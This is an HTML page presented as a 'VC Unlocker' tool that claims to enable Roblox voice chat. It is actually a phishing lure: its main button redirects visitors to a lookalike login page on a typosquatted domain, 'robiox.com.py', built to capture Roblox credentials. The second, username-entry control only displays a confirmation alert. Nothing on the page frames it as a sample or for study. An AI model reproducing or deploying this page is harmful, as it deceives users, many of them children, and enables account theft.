<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>VC Unlocker | Roblox</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: linear-gradient(135deg, #0a0c12 0%, #10131c 100%);
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
    }

    .container {
      max-width: 550px;
      width: 100%;
      background: rgba(18, 22, 35, 0.8);
      backdrop-filter: blur(12px);
      border-radius: 2rem;
      border: 1px solid rgba(66, 99, 235, 0.3);
      padding: 2rem;
      box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5);
    }

    h1 {
      font-size: 2rem;
      font-weight: 700;
      background: linear-gradient(135deg, #fff, #8aabff);
      background-clip: text;
      -webkit-background-clip: text;
      color: transparent;
      margin-bottom: 0.5rem;
    }

    .sub {
      color: #8e9ac0;
      margin-bottom: 2rem;
      font-size: 0.9rem;
    }

    .input-group {
      margin-bottom: 1.5rem;
    }

    label {
      display: block;
      margin-bottom: 0.5rem;
      color: #cbd5ff;
      font-weight: 500;
      font-size: 0.85rem;
    }

    input {
      width: 100%;
      background: #0f111f;
      border: 1.5px solid #2a2f4a;
      border-radius: 1rem;
      padding: 0.9rem 1rem;
      font-size: 0.95rem;
      color: white;
      outline: none;
      transition: all 0.2s;
    }

    input:focus {
      border-color: #3b82f6;
      box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.3);
    }

    button {
      width: 100%;
      background: linear-gradient(98deg, #2563eb, #3b82f6);
      border: none;
      padding: 0.9rem;
      border-radius: 1rem;
      font-weight: 600;
      font-size: 1rem;
      color: white;
      cursor: pointer;
      transition: transform 0.15s, box-shadow 0.2s;
      margin-bottom: 2rem;
    }

    button:hover {
      transform: translateY(-1px);
      box-shadow: 0 8px 20px rgba(37, 99, 235, 0.4);
    }

    .divider {
      text-align: center;
      color: #5f6a92;
      font-size: 0.8rem;
      margin: 1rem 0 1.2rem;
      position: relative;
    }

    .divider::before,
    .divider::after {
      content: '';
      position: absolute;
      top: 50%;
      width: 40%;
      height: 1px;
      background: #2a2f4a;
    }

    .divider::before { left: 0; }
    .divider::after { right: 0; }

    .username-section {
      margin-top: 0.5rem;
    }

    .inline-group {
      display: flex;
      gap: 10px;
    }

    .inline-group input {
      flex: 1;
    }

    .confirm-btn {
      width: auto;
      background: rgba(59, 130, 246, 0.2);
      border: 1.5px solid #3b82f6;
      padding: 0 1.5rem;
      margin-bottom: 0;
    }

    .confirm-btn:hover {
      background: rgba(59, 130, 246, 0.4);
    }

    @media (max-width: 480px) {
      .container { padding: 1.5rem; }
      .inline-group { flex-direction: column; }
      .confirm-btn { padding: 0.9rem; width: 100%; }
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>VC Unlocker</h1>
    <div class="sub">Unlock voice chat on Roblox</div>

    <!-- Profile link input -->
    <div class="input-group">
      <label>Roblox Profile Link</label>
      <input type="text" id="profileLink" placeholder="https://www.roblox.com/users/123456789/profile">
    </div>

    <!-- Get Link button - redirects to the specified URL -->
    <button id="getLinkBtn">Get Link & Unlock VC</button>

    <div class="divider">OR</div>

    <!-- Username + Confirm button -->
    <div class="username-section">
      <label>Enter Username</label>
      <div class="inline-group">
        <input type="text" id="username" placeholder="Your Roblox username">
        <button id="confirmBtn" class="confirm-btn">Confirm</button>
      </div>
    </div>
  </div>

  <script>
    // Get Link button: redirects to the exact URL
    document.getElementById('getLinkBtn').addEventListener('click', function() {
      window.location.href = "https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F274156662874%2FPLS-DONATE";
    });

    // Confirm button: just shows confirmation
    document.getElementById('confirmBtn').addEventListener('click', function() {
      const username = document.getElementById('username').value.trim();
      if (username === "") {
        alert("Please enter a username");
      } else {
        alert("Username confirmed: " + username);
      }
    });
  </script>
</body>
</html>
